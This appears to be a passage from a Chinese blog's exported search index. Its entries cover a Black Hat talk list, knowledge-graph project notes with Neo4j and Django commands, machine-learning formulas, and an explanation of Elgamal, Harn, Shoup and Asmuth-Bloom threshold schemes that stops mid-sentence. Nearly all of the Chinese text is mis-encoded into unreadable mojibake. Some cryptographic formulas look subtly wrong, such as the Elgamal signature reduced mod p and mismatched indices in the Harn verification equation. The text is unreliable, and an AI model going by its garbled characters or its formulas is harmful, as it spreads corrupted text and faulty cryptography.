Escapesä¸€ç¯‡é’ˆå¯¹å®¹å™¨é€ƒé€¸çš„æ¦‚è¿°ï¼Œä¸»è¦å†…å®¹åŒ…æ‹¬äº† linux å†…æ ¸å®¹å™¨åŸºç¡€ï¼Œæ‰§è¡Œé€ƒé€¸ï¼Œdockerã€RunCç­‰å®¹å™¨çš„æ¼æ´žä»¥åŠå†…æ ¸æ¼æ´žåˆ©ç”¨çš„ç ”ç©¶ Nick Freeman,Brandon Edwards Exploit Development,Platform Security 100 Adventures in the Underland: The CQForensic Toolkit as a Unique Weapon Against Hackers Paula Januszkiewicz Data Forensics/Incident Response 101 Attacking iPhone XS Maxè¿™ä¸ªè®®é¢˜ä»‹ç»äº† UNIX socket bind æ“ä½œå› ä¸´æ—¶ unlock å¼•å‘çš„ç«žäº‰æ¡ä»¶ï¼Œæœ€ç»ˆå¯¼è‡´äº†ä¸€ä¸ª UAF æ¼æ´žï¼Œä½œè€…ä»‹ç»äº†è¯¥æ¼æ´žåœ¨ A12 ä¹‹å‰å’Œä¹‹åŽçš„æ¼æ´žåˆ©ç”¨æ–¹æ³• Hao Xu,Tielei Wang Exploit Development,Mobile 102 Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs Meh Chang,Orange Tsai Web AppSec,Enterprise 103 Everybody be Cool, This is a Robbery! Jean-Baptiste BÃ©drune,Gabriel Campana Hardware/Embedded 104 Hacking Ten Million Useful Idiots: Online Propaganda as a Socio-Technical Security Project Pablo Breuer,David Perlman Policy,Human Factors 105 Integration of Cyber Insurance Into A Risk Management Program Jake Kouns Cyber Insurance 106 HostSplit: Exploitable Antipatterns in Unicode Normalization Jonathan Birch Applied Security,Web AppSec 107 Lessons From Two Years of Crypto Audits Jean-Philippe Aumasson Security Development Lifecycle,Cryptography 108 Securing Apps in the Open-By-Default Cloud Michael Wozniak,Winston Howes Enterprise,Security Development Lifecycle 109 Look, No Hands! â€“ The Remote, Interaction-less Attack Surface of the iPhone Natalie Silvanovich Mobile,Exploit Development 110 The Discovery of a Government Malware and an Unexpected Spy Scandal Lorenzo Franceschi-Bicchierai Mobile,Malware 111 MITRE ATT&amp;CK: The Play at Home Edition Ryan Kovar,Katie Nickels Data Forensics/Incident Response,Applied Security 112 The Future of ATO Philip Martin Web AppSec,Applied Security 113 Breaking Samsungâ€™s ARM TrustZone Joffrey Guilbon,Alexandre Adamski,Maxime Peterlin Hardware/Embedded,Mobile 114 Responding to a Cyber Attack with Missiles Mikko Hypponen Policy 115 Worm Charming: Harvesting Malware Lures for Fun and Profit Pedram Amini Applied Security,Malware 116 Command Injection in F5 iRules Christoffer Jerkeby Web AppSec,Network Defense 117 Debug for Bug: Crack and Hack Apple Core by Itself - Fun and Profit to Debug and Fuzz Apple Kernel by lldb Scriptä½¿ç”¨è‹¹æžœè‡ªå¸¦çš„ LLDB Script fuzz macOS ç³»ç»Ÿå†…æ ¸ Moony Li,Lilang Wu Platform Security 118 Arm IDA and Cross Check: Reversing the Boeing 787â€™s Core Network Ruben Santamarta Hardware/Embedded,Reverse Engineering 119 Exploring the New World : Remote Exploitation of SQLite and Curl HuiYu Wu,YuXiang Li,Wenxiang Qian Internet of Things,Exploit Development 120 Controlled Chaos: The Inevitable Marriage of DevOps &amp; Security Nicole Forsgren,Kelly Shortridge Applied Security,Security Development Lifecycle 121 How to Detect that Your Domains are Being Abused for Phishing by Using DNS Karl Lovink,Arnold HÃ¶lzel Policy,Applied Security 122 Every Security Team is a Software Team Now Dino Dai Zovi Keynote 123 A Decade After Bleichenbacher â€˜06, RSA Signature Forgery Still Works Sze Yiu Chau Web AppSec,Cryptography]]></content>
      <categories>
        <category>å®‰å…¨ä¼šè®®</category>
      </categories>
      <tags>
        <tag>å®‰å…¨ä¼šè®®</tag>
        <tag>blackhat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[çŸ¥è¯†å›¾è°±å®Œæ•´é¡¹ç›®å®žæˆ˜-ç¬”è®°]]></title>
    <url>%2F2019%2F08%2F08%2F%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%8C%E6%95%B4%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98-%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[ç½‘æ˜“äº‘è¯¾å ‚åœ°å€ åŸºç¡€ç†è®ºç¯‡å®Œæ•´é¡¹ç›®æ¡ˆä¾‹è¿è¡Œæ¼”ç¤ºæ¡ˆä¾‹é©±åŠ¨ï¼šæ±½è½¦é¢†åŸŸçŸ¥è¯†å›¾è°± å®žæˆ˜å¼€å‘ï¼šçŸ¥è¯†æŠ½å–ã€å»ºæ¨¡ã€æŽ¨ç†ã€å­˜å‚¨ã€åº”ç”¨ æºç å‰–æž æ¡ˆä¾‹æ•ˆæžœï¼š å®žä½“è¯†åˆ«ï¼ˆé€šç”¨å’Œé¢†åŸŸï¼‰ã€ä¸­æ–‡åˆ†è¯ã€è¯æ€§æ ‡æ³¨ å®žä½“æŸ¥è¯¢ï¼ˆå…³ç³»å›¾ï¼‰ å…³ç³»æŸ¥è¯¢ï¼ˆå…³ç³»å›¾ï¼‰ é¡¹ç›®å¼€å‘çŽ¯å¢ƒå®‰è£…éƒ¨ç½² å»ºè®®Djnagoå’ŒNeo4jè¿è¡Œåœ¨åŒä¸€æœåŠ¡å™¨ä¸Š é¡¹ç›®ä¸šåŠ¡éœ€æ±‚åˆ†æž åŸºäºŽæœç´¢å¼•æ“Žçš„å•†ä¸šæ•°æ®åˆ†æž é¡¹ç›®æ€»ä½“æž¶æž„è®¾è®¡ ETL(Extract-Transform-Load, æ•°æ®ä»“åº“æŠ€æœ¯)ï¼šå°†æ•°æ®ä»Žæ¥æºç«¯ç»è¿‡æå–ï¼ˆextractï¼‰ã€è½¬æ¢ï¼ˆtransformï¼‰ã€åŠ è½½ï¼ˆloadï¼‰è‡³ç›®çš„ç«¯ æ•°æ®æºï¼šç»“æž„åŒ–æ•°æ® &gt; åŠç»“æž„åŒ–æ•°æ® &gt; éžç»“æž„åŒ–æ•°æ® ç½‘ç»œçˆ¬è™«ï¼šScrapy æ¨¡åž‹è®¾è®¡ç¯‡çŸ¥è¯†å›¾è°±æ¨¡åž‹è®¾è®¡ å‚ç…§æ³•ï¼šUMLSï¼ˆä¸€ä½“åŒ–åŒ»å­¦è¯­è¨€ç³»ç»Ÿï¼‰ï¼ŒTCMLSï¼ˆä¸­åŒ»è¯å­¦è¯­è¨€ç³»ç»Ÿï¼‰ å½’çº³æ³•ï¼šäº§å“ç”Ÿå‘½å‘¨æœŸï¼Œä¸šåŠ¡æµç¨‹æ‹†è§£ çŸ¥è¯†å›¾è°±è¯­ä¹‰ç±»åž‹è®¾è®¡ é«˜å±‚æŠ½è±¡å¯å¤ç”¨ï¼ˆå‚ç…§ä¸Žå¯¹æ ‡ï¼‰ çŽ°è±¡æˆ–è¿‡ç¨‹ï¼šè¢«åŠ¨ æ´»åŠ¨ï¼šä¸»åŠ¨ åº•å±‚æ˜Žç»†éœ€é€‚é…ï¼ˆå½’çº³æ³•ï¼‰ çŸ¥è¯†å›¾è°±è¯­ä¹‰å…³ç³»è®¾è®¡æ–¹æ³•åŒä¸Š çŸ¥è¯†èŽ·å–ç¯‡ ç½‘ç»œçˆ¬è™«ï¼šåŠ¨æ€é¡µé¢ï¼Œçˆ¬è™«ä¸Žåçˆ¬è™« æ•°æ®å¯¼å…¥ï¼šNeo4j æ•°æ®èµ„äº§ å¼€å‘çŽ¯å¢ƒå®‰è£…éƒ¨ç½² PyCharm requests-html æ±½è½¦å“ç‰Œæ•°æ®èŽ·å– é¡µé¢å…ƒç´ åˆ†æž1url = 'https://car.autohome.com.cn/' æ±½è½¦è½¦ç³»æ•°æ®èŽ·å–æ±½è½¦æ•°æ®æ‰¹é‡å¯¼å…¥å“ç‰Œæ•°æ®å¯¼å…¥ å°†.csvæ”¾å…¥/var/lib/neo4j/import LOAD CSV WITH HEADERS FROM &quot;file:///bank.csv&quot; AS line CREATE (:Bank {name:line.bank, count:line.count}) è½¦ç³»æ•°æ®å¯¼å…¥ å°†.csvæ”¾å…¥/var/lib/neo4j/import LOAD CSV WITH HEADERS FROM &quot;file:///series.csv&quot; AS line CREATE (:Series {name:line.series, count:line.count}) å…³ç³»æ•°æ®å¯¼å…¥ LOAD CSV WITH HEADERS FROM &quot;file:///series.csv&quot; AS line MATCH (a:Bank{name:line.bank}), (b:Series {name:line.series}) CREATE (a)-[:Subtype]-&gt;(b) åˆ›å»ºç´¢å¼• CREATE CONSTRAINT ON (b:Bank) ASSERT b.name IS UNIQUE æ±½è½¦è½¦åž‹æ•°æ®èŽ·å–æ±½è½¦é…ç½®æ•°æ®èŽ·å–ç¨‹åºè®¾è®¡ç¯‡ Webå‰ç«¯æ¡†æž¶ï¼šdjango å®žä½“å…³ç³»æŸ¥è¯¢ï¼Œå‘½åå®žä½“æŸ¥è¯¢ å›¾æ•°æ®å¯è§†åŒ–ï¼šEcharts webå‰ç«¯æ¡†æž¶è®¾è®¡123urls.py -&gt; *view.py -&gt; templatespython manage.py runserver 0:8000 é€šç”¨é¢†åŸŸå‘½åå®žä½“è¯†åˆ« ä¸‰å¤§ç±»ï¼šå®žä½“ç±»ã€æ—¶é—´ç±»ã€æ•°å­—ç±» ä¸ƒå°ç±»ï¼šï¼šäººåã€æœºæž„åã€åœ°åã€æ—¶é—´ã€æ—¥æœŸã€è´§å¸ã€ç™¾åˆ†æ¯” åŸºäºŽè¯å…¸çš„æ–¹æ³• è¯æ€§æ ‡æ³¨ THULACï¼šä¸€ä¸ªé«˜æ•ˆçš„ä¸­æ–‡è¯æ³•åˆ†æžå·¥å…·åŒ…12345n/åè¯ np/äººå ns/åœ°å ni/æœºæž„å nz/å…¶å®ƒä¸“åm/æ•°è¯ q/é‡è¯ mq/æ•°é‡è¯ t/æ—¶é—´è¯ f/æ–¹ä½è¯ s/å¤„æ‰€è¯v/åŠ¨è¯ a/å½¢å®¹è¯ d/å‰¯è¯ h/å‰æŽ¥æˆåˆ† k/åŽæŽ¥æˆåˆ† i/ä¹ è¯­ j/ç®€ç§° r/ä»£è¯ c/è¿žè¯ p/ä»‹è¯ u/åŠ©è¯ y/è¯­æ°”åŠ©è¯e/å¹è¯ o/æ‹Ÿå£°è¯ g/è¯­ç´  w/æ ‡ç‚¹ x/å…¶å®ƒ å¼€æºæ¡†æž¶CoreNLP java åŸºäºŽCRF /Oè¡¨ç¤ºéžå®žä½“ 1java -mx600m -cp standford-ner-3.9.1.jar edu.stanford.nlp.ie.NERClassifierCombiner -ner.model classifiers/chinese.kbp.distsim.crf.ser.gz -inputEncoding gb18030 -textFile test.txt åž‚ç›´é¢†åŸŸå‘½åå®žä½“è¯†åˆ«æ±½è½¦é¢†åŸŸå‘½åå®žä½“è¯å…¸è®¾è®¡å’Œåº”ç”¨ï¼ˆç”Ÿäº§çŽ¯å¢ƒï¼‰ å®žä½“æŸ¥è¯¢ç¨‹åºè®¾è®¡ Neo4jå¼€å‘é©±åŠ¨ Py2neoå¼€å‘æ¡†æž¶ run() data() neo4j_models.py å…³ç³»æŸ¥è¯¢ç¨‹åºè®¾è®¡çŸ¥è¯†å›¾è°±æ•°æ®å¯è§†åŒ– å¯è§†åŒ–æ–¹æ¡ˆï¼šD3å’ŒEcharts Echarts çŸ¥è¯†å›¾è°±åº”ç”¨æŽ¨èç³»ç»ŸåŸºæœ¬åŽŸç†å’Œå®žçŽ°æœºåˆ¶æŽ¨èç³»ç»Ÿç±»åž‹ ç±»åž‹ ç®—æ³• ä¼˜åŠ¿ åŠ£åŠ¿ æ¡ˆä¾‹ åŸºäºŽäº¤æ˜“åŽ†å² ååŒè¿‡æ»¤ å‡†ç¡®æ€§é«˜ å†·å¯åŠ¨ å•†å“æŽ¨èï¼ˆå•¤é…’ä¸Žå°¿å¸ƒï¼‰ åŸºäºŽè¡Œä¸ºè½¨è¿¹ ååŒè¿‡æ»¤ æ•°æ®å¯†é›† å‡†ç¡®æ€§ä½Ž å†…å®¹æŽ¨è åŸºäºŽçŸ¥è¯†å›¾è°± ç›¸ä¼¼è®¡ç®— å†·çƒ­æ— å…³ çŸ¥è¯†å»ºæ¨¡ å•†å“æŽ¨è çŸ¥è¯†å›¾è°±ä¸ŽæŽ¨èç³»ç»Ÿèžåˆçš„æ¨¡å¼èžåˆæ–¹å¼ æ–¹å¼ ç®—æ³• ä¼˜åŠ¿ æ¡ˆä¾‹ åŸºäºŽå®žä½“å±žæ€§ å®žä½“ç›¸ä¼¼ çº¿ç´¢æ‹“å±• åŒä¸€ä»·ä½ åŸºäºŽå®žä½“å…³ç³» å®žä½“ç›¸å…³ çº¿ç´¢æ‹“å±• åŒä¸€å“ç‰Œ åŸºäºŽç‰¹å¾å‘é‡ æ°´æ³¢ç®—æ³• çº¿ç´¢æ‹“å±• RippleNet ä¾æ¬¡è®­ç»ƒã€è”åˆè®­ç»ƒã€äº¤æ›¿è®­ç»ƒ åŸºäºŽKGEçš„å¼€æºæŽ¨èç³»ç»Ÿæ¡†æž¶RippleNetåŸºäºŽKGEçš„è”åˆè®­ç»ƒæŽ¨èæ¡†æž¶å·¥ä½œåŽŸç†å’Œå®žçŽ°æœºåˆ¶ ç»¿è‰²æ¡çŠ¶ä¸ºè¾“å‡ºï¼Œæœ€åŽå½¢æˆç”¨æˆ·å‘é‡ï¼Œå¹¶ä¸Žç‰©å“å‘é‡è®¡ç®—ç›¸ä¼¼åº¦ã€‚ Hop èŠ‚ç‚¹å‘å‡ºåº¦æ–¹å‘è·³è·ƒä¸€æ¬¡ï¼Œå½¢æˆRippleé›†åˆã€‚ å¯¹äºŽç»™å®šçš„ç”¨æˆ·uå’Œç‰©å“vï¼Œæˆ‘ä»¬å°†åŽ†å²ç›¸å…³å®žä½“é›†åˆVä¸­çš„æ‰€æœ‰å®žä½“è¿›è¡Œç›¸ä¼¼åº¦è®¡ç®—ï¼Œå¹¶åˆ©ç”¨è®¡ç®—å¾—åˆ°çš„æƒé‡å€¼å¯¹Vä¸­å®žä½“åœ¨çŸ¥è¯†å›¾è°±ä¸­å¯¹åº”çš„å°¾èŠ‚ç‚¹è¿›è¡ŒåŠ æƒæ±‚å’Œã€‚æ±‚å’Œå¾—åˆ°çš„ç»“æžœå¯ä»¥è§†ä¸ºvåœ¨uçš„ä¸€è·³ç›¸å…³å®žä½“ä¸­çš„ä¸€ä¸ªå“åº”ã€‚è¯¥è¿‡ç¨‹å¯ä»¥é‡å¤åœ¨uçš„äºŒè·³ã€ä¸‰è·³ç›¸å…³å®žä½“ä¸­è¿›è¡Œï¼Œå¦‚æ­¤våœ¨çŸ¥è¯†å›¾è°±ä¸Šä¾¿ä»¥Vä¸ºä¸­å¿ƒé€å±‚å‘å¤–æ‰©æ•£ã€‚ RippleNetä¸­æ²¡æœ‰å¯¹ç”¨æˆ·ç›´æŽ¥ä½¿ç”¨å‘é‡è¿›è¡Œåˆ»ç”»ï¼Œè€Œæ˜¯ç”¨ç”¨æˆ·ç‚¹å‡»è¿‡çš„ç‰©å“å‘é‡é›†åˆä½œä¸ºå…¶ç‰¹å¾ã€‚ RippleNetå¼€æºæ¡†æž¶æºç å‰–æžRippleNet tensorflow]]></content>
      <categories>
        <category>çŸ¥è¯†å›¾è°±</category>
      </categories>
      <tags>
        <tag>çŸ¥è¯†å›¾è°±</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AI ç®—æ³•ä¸­çš„æ•°å­¦å…¬å¼]]></title>
    <url>%2F2019%2F05%2F24%2FAI%E7%AE%97%E6%B3%95%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[AI ç®—æ³•ä¸­çš„ä¸€äº›æ•°å­¦å…¬å¼ DDPG$$\begin{aligned}\nabla_{\theta^\mu}J&amp;\approx\mathbb{E}_{s_t\backsim\rho^\beta}[\nabla_{\theta^\mu}Q(s,a|\theta^Q)|_{s=s_t,a=\mu(s_t|\theta^\mu)}] \\&amp;=\mathbb{E}_{s_t\backsim\rho^\beta}[\nabla_{a}Q(s,a|\theta^Q)|_{s=s_t,a=\mu(s_t)}\nabla_{\theta_\mu}\mu(s|\theta^\mu)|_{s=s_t}]\end{aligned}$$ GEN$$g=&lt;V,E,\phi&gt;$$ $$\forall v\in V,v\rightarrow x_v\rightarrow \mu_v$$ $$N_v$$ $$\mu_v=F(x_v,\sum_{j\in N_v}\mu_j)$$ $$P=\lbrace P_1,P_2,\cdots,P_n\rbrace$$ $$ReLU(\cdot)=max\lbrace 0,\cdot\rbrace$$ $$\mu_v^{(t)}=tanh(W_1x_v+\sigma(\sum_{j\in N_v}\mu_j^{(t-1)}))$$ $$\sigma(x)=P_1ReLU(P_2\cdots ReLU(P_n(x)))$$ $$\mu_g=W_2\sum_{v\in V}\mu_v^T$$ $$Z=W_3\mu_g$$ $$Q=\lbrace p,1-p\rbrace,p\in[0,1]$$ $$Q=Softmax(Z)$$ $$\min_{W_1,W_2,W_3,â€¦,P_1,P_2,â€¦,P_n}\sum_{i=1}^m(H(Q,l))$$ åœ¨è¿™é‡Œå°†Markdownçš„å…¬å¼è½¬æ¢ä¸ºMathMLä»£ç ï¼ˆWordï¼‰å‚è€ƒ]]></content>
      <categories>
        <category>æœºå™¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>æ•°å­¦åŽŸç†</tag>
        <tag>æœºå™¨å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç§˜å¯†å…±äº«åŠé—¨é™ç­¾å]]></title>
    <url>%2F2019%2F05%2F14%2F%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB%E5%8F%8A%E9%97%A8%E9%99%90%E7%AD%BE%E5%90%8D%2F</url>
    <content type="text"><![CDATA[Elgamal ç­¾åç®—æ³• $\rightarrow$ Harn çš„é—¨é™ç­¾åæ–¹æ¡ˆ RSA $\rightarrow$ Shoup é—¨é™ç­¾åæ–¹æ¡ˆ Asmuth-Bloom æ³• Karnin-Greene-Hellman æ³• Shamir é—¨é™æ³•ï¼ˆæ‹‰æ ¼æœ—æ—¥æ’å€¼æ³•ï¼‰ Elgamal ç­¾åç®—æ³•ä¾èµ–æœ‰é™åŸŸä¸Šçš„ç¦»æ•£æŒ‡æ•°çš„éš¾è®¡ç®—æ€§ï¼Œå³è®¾$g$ä¸ºç´ æ•°$p$çš„æ¨¡å¾ªçŽ¯ç¾¤çš„åŽŸæ ¹ï¼Œå¯¹ä»»æ„çš„$a$ï¼Œè®¡ç®—ï¼š $$b=g^a\bmod p$$ æ˜¯å®¹æ˜“çš„ï¼ˆé€šè¿‡å¹‚å–æ¨¡ç®—æ³•ï¼‰ã€‚åè¿‡æ¥ï¼Œç»™å®š$b$è®¡ç®—æ»¡è¶³ä¸Šå¼çš„$a$æ˜¯éžå¸¸å›°éš¾çš„ï¼Œ$a$ç§°ä¸ºä»¥$g$ä¸ºåŸº$b$çš„ç¦»æ•£å¯¹æ•°ã€‚ åˆå§‹åŒ–Aliceéšæœºé€‰æ‹©å¤§ç´ æ•°$p$å’Œ$1$åˆ°$p$ä¹‹é—´çš„æ•´æ•°$x$ï¼Œæ‰¾å‡ºæœ‰é™åŸŸ$Z_p$çš„ä¸€ä¸ªç”Ÿæˆå…ƒ$g$ï¼Œè®¡ç®—ï¼š $$y=g^x\bmod p$$ åˆ™å…¬é’¥ä¸º$y$ï¼Œç§é’¥ä¸º$x$ã€‚ ç­¾åè®¾å¾…ç­¾åæ¶ˆæ¯ä¸º$m$ï¼ŒAliceéšæœºé€‰æ‹©æ•´æ•°$k$ï¼Œæ»¡è¶³$k&lt;p$ï¼Œ$gcd(k,p-1)=1$ã€‚è®¡ç®—ï¼š $$r=g^k\bmod p$$$$s=(m-xr)k^{-1}\bmod p$$ å°†$m$çš„ç­¾å$(r,s)$å‘é€ç»™Bobã€‚ éªŒè¯Bobæ”¶åˆ°$(r,s)$ï¼Œåˆ©ç”¨Aliceçš„å…¬é’¥$y$éªŒè¯ç­‰å¼ï¼š $$g^m\equiv y^rr^s\bmod p$$ è‹¥ç­‰å¼æˆç«‹åˆ™ç­¾åæœ‰æ•ˆã€‚ Harn çš„é—¨é™ç­¾åæ–¹æ¡ˆåˆå§‹åŒ–å‡è®¾æœ‰$n$ä¸ªæˆå‘˜$P_1,P_2,\cdots,P_n$ï¼Œ$t$ä¸ºé—¨é™å€¼ï¼Œ$p$ã€$q$ä¸ºå¤§ç´ æ•°ï¼Œ$q|(p-1)$ï¼Œ$g$ä¸ºæœ‰é™åŸŸ$Z_p$ä¸Šçš„$q$é˜¶ç”Ÿæˆå…ƒï¼Œ$h$æ˜¯$g$çš„å¾ªçŽ¯ç¾¤ä¸­çš„ä¸€ä¸ªæ•°ï¼Œå¾…ç­¾åæ¶ˆæ¯ä¸º$m$ï¼Œæ¯ä¸ªæˆå‘˜éšæœºé€‰æ‹©$z_i$å’Œ$x_i$ï¼Œè®¡ç®—ï¼š $$y_i=g^{z_i}\bmod p$$ æˆå‘˜$P_i$ç§é’¥ä¸º$z_i$ï¼Œç»„å…¬é’¥$y$è®¡ç®—å¦‚ä¸‹ï¼š $$y=\prod_{i=1}^ny_i\bmod p$$ $P_i(i=1,2,\cdots,n)$é€‰å–ä¸€ä¸ª$t-1$æ¬¡å¤šé¡¹å¼ï¼š$f_i(x)=z_i+a_{i,1}x+a_{i,2}x^2+\cdots+a_{i,t-1}x^{t-1}$ï¼Œè®¡ç®—å½±å­ä»½é¢$f_i(x_j)\bmod q$å‘é€ç»™$P_j$ï¼Œå¹¶è®¡ç®—éªŒè¯ä¿¡æ¯ï¼š $$y_{i,j}=g^{f_i(x_j)}\bmod p$$ äº§ç”Ÿéƒ¨åˆ†ç­¾åè®¾å‚ä¸Žç­¾åçš„æˆå‘˜$P_1,P_2,\cdots,P_t$ã€‚æˆå‘˜$P_i(i=1,2,\cdots,t)$é€‰æ‹©ä¸€ä¸ªéšæœºæ•°$k_i\in[1,q-1]$ï¼Œè®¡ç®—$r_i=g^{k_i}\bmod p$å¹¶å°†å…¶å¹¿æ’­ç»™æ‰€æœ‰æˆå‘˜ã€‚ æ”¶åˆ°å…¶ä»–æˆå‘˜å¹¿æ’­çš„$r_i$åŽï¼Œ$P_i$è®¡ç®— $$r=\prod_{i=1}^tr_i\bmod p$$ é€šè¿‡è‡ªå·±çš„ç§é’¥$z_i$ã€$k_i$ã€ä»½é¢$f_j(x_i)(j=t+1,t+2,\cdots,n)$è®¡ç®—ï¼š $$s_i=z_i+\lbrace\sum_{j=t+1}^nf_j(x_i)(\prod_{k=1,k\neq i}^t\frac{-x_k}{x_k-x_j})\rbrace m-k_i r\bmod q$$ å°†éƒ¨åˆ†ç­¾å$(r_i,s_i)$å‘é€ç»™ç­¾ååˆæˆè€…ã€‚ åˆæˆè€…æ”¶åˆ°$\lbrace r_i,s_i\rbrace$åŽï¼Œé€šè¿‡ä¸‹å¼éªŒè¯å…¶æœ‰æ•ˆæ€§ï¼š $$\lbrace y_i(\prod_{j=t+1}^ny_{j,i})^{\prod_{k=1,k\neq i}^t\frac{-x_k}{x_i-x_k}}\rbrace^m=r_i^r g^{s_j}\bmod p$$ è‹¥éªŒè¯å¼æˆç«‹ï¼Œåˆ™æ”¶åˆ°çš„éƒ¨åˆ†ç­¾å$\lbrace r_i,s_i\rbrace$æœ‰æ•ˆã€‚ äº§ç”Ÿç»„ç­¾ååˆæˆè€…ç¡®è®¤æŽ¥æ”¶åˆ°$t$ä¸ªæ­£ç¡®çš„éƒ¨åˆ†ç­¾ååŽï¼Œè®¡ç®—ï¼š $$s=\sum_{i=1}^ts_i\bmod q$$ å°†$\lbrace r,s\rbrace$ä½œä¸ºæ¶ˆæ¯$m$çš„ç»„ç­¾åã€‚ éªŒè¯ç­¾åéªŒè¯è€…æ”¶åˆ°ç»„ç­¾ååŽï¼ŒéªŒè¯å…¶æœ‰æ•ˆæ€§ï¼š $$y^m=r^r g^s \bmod p$$ æ¯ä¸ªå‚ä¸Žè€…æ‹¥æœ‰çš„æ•°$$P_1\begin{cases}z_1\stackrel{}{\longrightarrow} y_1\stackrel{}{\longrightarrow} y \ f_1(x)\stackrel{x_j}{\longrightarrow} f_1(x_j){\longrightarrow} y_{1,j} \ f_j(x_1) {\longrightarrow} y_{j,1} \ k_1\stackrel{}{\longrightarrow} r_1 \stackrel{r_j}{\longrightarrow} r \ \end{cases}$$ Shoup é—¨é™ç­¾åæ–¹æ¡ˆRSA ä½“åˆ¶ä¸­$p,q$ä¸ºå®‰å…¨å¤§ç´ æ•°ï¼Œå³å­˜åœ¨å¤§ç´ æ•°$pâ€™,qâ€™$ä½¿å¾—$p=2pâ€™+1$ï¼Œ$q=2qâ€™+1$ï¼Œè®°$m=pâ€™qâ€™$ã€‚ åˆå§‹åŒ–å¯ä¿¡ä¸­å¿ƒTCéšæœºé€‰å–æ¬¡æ•°ä¸è¶…è¿‡$t-1$çš„å¤šé¡¹å¼ $$f(x)=\sum_{j=0}^{t-1}a_jx^j\in Z_m[x]$$ å…¶ä¸­$a_0=d$ï¼Œ$a_j\in Z_m(j=1,2,\cdots,n)$ã€‚ TCè®¡ç®—$d_i$ï¼Œå¹¶å°†å…¶å‘é€ç»™æˆå‘˜$P_i$ï¼š $$d_i=f(i)\bmod m$$ åŒæ—¶è®¡ç®—$\pi=n!$ã€‚ TCå…¬å¼€$N$ã€$e$ã€$\pi$ã€‚ äº§ç”Ÿéƒ¨åˆ†ç­¾åæˆå‘˜$P_i$è®¡ç®—æ¶ˆæ¯æ‘˜è¦$x=H(M)$ï¼Œç„¶åŽè®¡ç®—ï¼š $$x_i=x^{2\pi d_i}\bmod N$$ äº§ç”Ÿç»„ç­¾åè‹¥æœ‰$t$ä¸ªæˆå‘˜$P_i(i\in B,|B|=t)$äº§ç”Ÿæ­£ç¡®çš„éƒ¨åˆ†ç­¾å$s_i(i\in B)$ï¼Œåˆ™è®¡ç®— $$y=\prod_{i=1}^tx_i^{2\pi \lambda_{0,i}}\bmod N=x^{4\pi^2d}\bmod N$$ ä»¤$eâ€™=4\pi^2$ï¼Œç”±æ¬§å‡ é‡Œå¾—å®šç†å¯çŸ¥å­˜åœ¨$a$ï¼Œ$b$ä½¿å¾—$gcd(e,eâ€™)=1$ï¼Œå³$ae+beâ€™=1$ï¼Œæœ€ç»ˆç­¾åï¼š $$s=y^bx^a\bmod N$$ éªŒè¯ç­¾åéªŒè¯é—¨é™ç­¾å$(M,s)$æ—¶ï¼ŒéªŒè¯ä»¥ä¸‹ç­‰å¼æ˜¯å¦æ­£ç¡®ï¼š $$s^e=H(M)\bmod N$$ Asmuth-Bloom æ³•åˆå§‹åŒ–å‡è®¾$S$ä¸ºå…±äº«ç§˜å¯†ï¼Œ$DCA$ä¸ºç§˜å¯†åˆ†å‘è€…ï¼Œæœ‰$n$ä¸ªæˆå‘˜$P_1,P_2,\cdots,P_n$ï¼Œ$t$ä¸ºæ¢å¤ç§˜å¯†çš„é—¨é™å€¼ã€‚$DC$é€‰æ‹©å¤§ç´ æ•°$q$å’Œä¸¥æ ¼é€’å¢žçš„åºåˆ—$d=\lbrace d_1,d_2,\cdots,d_n\rbrace$ï¼Œ$d$æ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼š $$d_1&lt;d_2&lt;\cdots&lt;d_n$$ $$(d_i,d_j)=1,(i\neq j)$$ $$(d_i,q)=1,(i=1,2,\cdots,n)$$ $$\prod_{i=1}^td_i&gt;q\prod_{i=1}^{t-1}d_{n-i+1}$$ ç§˜å¯†åˆ†å‘ä»¤$M=\prod_{i=1}^td_i$ï¼Œé€‰æ‹©æ»¡è¶³å¼$0\leq A\leq \frac{M}{q}-1$çš„æ•´æ•°$A$ï¼Œ$DC$è®¡ç®—ï¼š $$Z=S+Aq$$ $$Z_i=Z\bmod d_i,i=1,2,\cdots,n$$ å¹¶å°†$(Z_i,d_i)$ä½œä¸ºç§˜å¯†ä»½é¢å‘ç»™æˆå‘˜$P_i,(i=1,2,\cdots,n)$ã€‚ ç§˜å¯†æ¢å¤é€‰å–$t$ä¸ªæˆå‘˜$\lbrace P_1,P_2,\cdots,P_t\rbrace$å‚ä¸Žç§˜å¯†çš„æ¢å¤ï¼Œé€šè¿‡äº¤æ¢ç§˜å¯†ä»½é¢ï¼Œä»»æ„æˆå‘˜$P_i$å¯ä»¥å»ºç«‹åŒä½™æ–¹ç¨‹ç»„ï¼š $$\begin{cases}Z_1=Z\bmod d_1 \\Z_2=Z\bmod d_2 \\\vdots \\Z_t=Z\bmod d_t\end{cases}$$ ç”±$CRT$å¯çŸ¥è¯¥æ–¹ç¨‹ç»„æœ‰å”¯ä¸€è§£ï¼š $$Z=\sum_{i=1}^t\frac{D}{d_i}\cdot e_i\cdot Z_i\bmod D,i=1,2,..,t$$ å…¶ä¸­ï¼š $$D=\prod_{i=1}^td_i$$ $$\frac{D}{d_i}\cdot e_i \equiv 1\bmod d_i,i=1,2,\cdots,t$$ å¯æ±‚å‡ºå…±äº«ç§˜å¯†$S=Z\bmod q$ã€‚ Karnin-Greene-Hellman æ³•äº§ç”Ÿä¸»æ¬¡å¯†é’¥(m,n) ä¿¡ä»»å•ä½äº§ç”Ÿ$n+1$ä¸ªä»»æ„$n\times\frac{n}{m}$ç»´çŸ©é˜µï¼ŒçŸ©é˜µå…ƒç´ ä¸º$0$æˆ–$1$ï¼Œåˆ†åˆ«ä¸º$\lbrace A_1,A_2,\cdots,A_n\rbrace$ ä¿¡ä»»å•ä½äº§ç”Ÿ$1$ä¸ªä»»æ„$1\times n$ç»´çŸ©é˜µ$U$ 